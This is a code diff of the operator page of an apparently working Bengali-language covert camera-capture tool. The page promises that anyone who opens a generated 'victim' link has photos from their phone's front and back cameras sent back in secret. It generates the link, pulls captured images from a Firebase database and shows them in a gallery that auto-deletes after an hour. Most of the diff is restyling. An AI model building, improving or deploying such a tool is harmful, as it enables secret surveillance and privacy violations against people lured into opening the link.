@@ -3,63 +3,64 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>LiveView • গোপন ছবি দেখুন</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700;800&display=swap" rel="stylesheet">
+<title>LiveView • গোপন ছবি</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Poppins',sans-serif;background:#f8f9fa;color:#222;line-height:1.6}
-header{background:#fff;padding:20px 0;text-align:center;box-shadow:0 2px 15px rgba(0,0,0,0.08);position:sticky;top:0;z-index:100}
-.logo{height:80px;border-radius:50%;border:4px solid #ff0050;box-shadow:0 0 25px rgba(255,0,80,0.3)}
-.container{max-width:1000px;margin:30px auto;padding:20px;text-align:center}
-.thumb{max-width:90%;border-radius:20px;margin:30px auto;box-shadow:0 15px 35px rgba(0,0,0,0.1);border:1px solid #eee}
-h1{font-size:2.8em;margin:20px 0;color:#ff0050;font-weight:800}
-p{font-size:1.2em;color:#555;margin:15px auto;max-width:700px}
-.btn{background:#ff0050;color:#fff;padding:16px 50px;font-size:1.3em;border:none;border-radius:50px;cursor:pointer;margin:15px;font-weight:700;box-shadow:0 8px 25px rgba(255,0,80,0.3);transition:.3s}
-.btn:hover{transform:translateY(-5px);box-shadow:0 15px 35px rgba(255,0,80,0.4)}
-#linkBox{display:none;margin:40px auto;padding:30px;background:#fff;border-radius:20px;max-width:800px;box-shadow:0 10px 30px rgba(0,0,0,0.1);border:2px dashed #ff0050}
-#victimLink{width:100%;padding:16px;font-size:1.1em;background:#fff;border:2px solid #ff0050;border-radius:15px;color:#d00040;text-align:center;margin:15px 0;word-break:break-all;font-weight:600}
-.gallery{margin-top:60px;padding:20px}
-.gallery h2{font-size:2em;color:#ff0050;margin-bottom:30px}
-.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:25px}
-.card{background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.1);transition:.4s;position:relative}
-.card:hover{transform:translateY(-10px);box-shadow:0 20px 40px rgba(255,0,80,0.2)}
-.card img{width:100%;height:320px;object-fit:cover;border-bottom:4px solid #ff0050}
-.time{background:#ff0050;color:#fff;padding:10px;font-size:0.9em;text-align:center;font-weight:600}
-.noimg{background:#fff;padding:60px;border-radius:20px;color:#888;font-size:1.4em;box-shadow:0 5px 20px rgba(0,0,0,0.08)}
-footer{background:#fff;padding:40px;text-align:center;color:#666;margin-top:80px;border-top:1px solid #eee;font-size:1em}
-footer a{color:#ff0050;text-decoration:none;font-weight:600}
+body{font-family:'Poppins',sans-serif;background:#f8f9fa;color:#1e3a8a;line-height:1.5}
+header{background:#fff;padding:5px 0;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,0.08);position:sticky;top:0;z-index:100}
+.logo{height:80px;border-radius:5%;border:0px solid #3b82f6;box-shadow:0 0 0px rgba(59,130,246,0.3)}
+.container{max-width:100%;padding:15px}
+.thumb{width:100%;max-width:400px;border-radius:16px;margin:20px auto;display:block;box-shadow:0 10px 30px rgba(0,0,0,0.12);border:1px solid #e0e7ff}
+h1{font-size:1.8em;margin:15px 0;color:#1e40af;font-weight:700;text-align:center}
+p{font-size:1.05em;color:#475569;text-align:center;margin:10px auto;max-width:90%}
+.btn{background:#3b82f6;color:#fff;padding:14px 40px;font-size:1.1em;border:none;border-radius:50px;cursor:pointer;margin:15px auto;display:block;width:90%;max-width:350px;font-weight:600;box-shadow:0 8px 20px rgba(59,130,246,0.3);transition:.3s}
+.btn:hover{transform:translateY(-3px);box-shadow:0 12px 25px rgba(59,130,246,0.4)}
+#linkBox{display:none;margin:30px auto;padding:20px;background:#fff;border-radius:16px;box-shadow:0 8px 25px rgba(0,0,0,0.1);border:2px dashed #3b82f6;width:90%;max-width:400px}
+#victimLink{width:100%;padding:14px;font-size:1em;background:#eff6ff;border:2px solid #3b82f6;border-radius:12px;color:#1e40af;text-align:center;margin:12px 0;word-break:break-all;font-weight:600}
+.gallery{margin-top:40px;padding:10px}
+.gallery h2{font-size:1.5em;color:#1e40af;margin-bottom:20px;text-align:center}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:14px;padding:0 10px}
+.card{background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 6px 20px rgba(0,0,0,0.1);transition:.3s}
+.card:hover{transform:translateY(-6px);box-shadow:0 12px 30px rgba(59,130,246,0.2)}
+.card img{width:100%;height:180px;object-fit:cover;border-bottom:4px solid #3b82f6}
+.time{background:#3b82f6;color:#fff;padding:8px;font-size:0.8em;text-align:center;font-weight:600}
+.noimg{background:#fff;padding:50px;border-radius:16px;text-align:center;color:#64748b;font-size:1.1em;box-shadow:0 5px 15px rgba(0,0,0,0.08);margin:20px}
+footer{background:#fff;padding:30px;text-align:center;color:#64748b;font-size:0.9em;border-top:1px solid #e0e7ff;margin-top:60px}
+footer a{color:#3b82f6;text-decoration:none;font-weight:600}
 </style>
 </head>
 <body>
 
 <header>
-  <img src="https://i.ibb.co.com/5YZpX7K/logo.png" alt="Logo" class="logo">
+  <img src="https://raw.githubusercontent.com/shakib0122222/camnei/e78f33c9714e8c7f7a4af4183ce8d6f4e506c4d1/20251201_102630.png
+" alt="Logo" class="logo">
 </header>
 
 <div class="container">
-  <img src="https://i.ibb.co.com/4pJ3T1F/thumb.jpg" alt="Demo" class="thumb">
+  <!-- থাম্বনেইল - চাইলে লিংক চেঞ্জ করো -->
+  <img src="https://files.catbox.moe/iqmhky.jpg" alt="Demo" class="thumb">
 
   <h1>গোপনে লাইভ ছবি দেখুন</h1>
-  <p>যে কেউ লিংক ওপেন করলেই তার ফোনের সামনে + পিছনে ক্যামেরা থেকে ছবি এখানে চলে আসবে!</p>
+  <p>লিংক শেয়ার করুন → কেউ খুললেই তার ক্যামেরা থেকে ছবি এখানে চলে আসবে!</p>
 
-  <button class="btn" onclick="generateLink()">নতুন গোপন লিংক তৈরি করুন</button>
+  <button class="btn" onclick="generateLink()">নতুন লিংক তৈরি করুন</button>
 
   <div id="linkBox">
-    <h2 style="color:#ff0050;margin-bottom:20px">তোমার লিংক রেডি!</h2>
+    <h2 style="color:#1e40af;font-size:1.3em;margin-bottom:15px">তোমার লিংক রেডি!</h2>
     <input type="text" id="victimLink" readonly>
-    <br><br>
-    <button class="btn" onclick="copyLink()">কপি করুন</button>
+    <button class="btn" onclick="copyLink()" style="background:#10b981">কপি করুন</button>
   </div>
 
   <div class="gallery">
-    <h2>লাইভ ছবি গ্যালারি (১ ঘণ্টা পর্যন্ত থাকবে)</h2>
-    <div class="noimg" id="noimg">এখনো কোনো ছবি আসেনি। লিংক শেয়ার করুন!</div>
+    <h2>লাইভ ছবি (১ ঘণ্টা পর্যন্ত)</h2>
+    <div class="noimg" id="noimg">এখনো কোনো ছবি আসেনি...</div>
     <div class="grid" id="grid"></div>
   </div>
 </div>
 
 <footer>
-  © 2025 COPYRIGHT BY <a href="#">X4XOR</a> · ATI LINKABLE THAKBE
+  © 2025 COPYRIGHT BY <a href="#">X4XOR</a>
 </footer>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
@@ -75,7 +76,6 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-// লোকাল স্টোরেজে ID সেভ করা হবে → রিফ্রেশে হারাবে না
 let currentId = localStorage.getItem("currentCamId") || null;
 
 if(currentId){
@@ -86,7 +86,7 @@ if(currentId){
 
 function generateLink(){
   currentId = Date.now().toString(36);
-  localStorage.setItem("currentCamId", currentId); // সেভ করলাম
+  localStorage.setItem("currentCamId", currentId);
   const link = location.origin + location.pathname.replace("index.html","") + "view.html?id=" + currentId;
   
   document.getElementById("linkBox").style.display = "block";
@@ -99,7 +99,7 @@ function generateLink(){
 function copyLink(){
   const inp = document.getElementById("victimLink");
   inp.select(); document.execCommand("copy");
-  alert("লিংক কপি হয়ে গেছে!");
+  alert("কপি হয়ে গেছে!");
 }
 
 function loadPhotos(){
@@ -114,20 +114,19 @@ function loadPhotos(){
     const card = document.createElement("div");
     card.className = "card";
     card.innerHTML = `
-      <img src="${data.data}" alt="Captured" onclick="window.open('${data.data}')">
-      <div class="time">${new Date(data.time).toLocaleString('bn-BD')}</div>
+      <img src="${data.data}" onclick="window.open('${data.data}')">
+      <div class="time">${new Date(data.time).toLocaleTimeString('bn-BD')}</div>
     `;
     document.getElementById("grid").appendChild(card);
   });
 
-  // ১ ঘণ্টা পর ডিলিট + লোকাল স্টোরেজ ক্লিয়ার
   setTimeout(() => {
     ref.remove();
     localStorage.removeItem("currentCamId");
     document.getElementById("grid").innerHTML = "";
     document.getElementById("noimg").style.display = "block";
-    document.getElementById("noimg").innerText = "ছবির মেয়াদ শেষ! নতুন লিংক তৈরি করুন।";
-  }, 3600000); // ১ ঘণ্টা
+    document.getElementById("noimg").innerText = "মেয়াদ শেষ! নতুন লিংক তৈরি করুন।";
+  }, 3600000);
 }
 </script>
 </body>
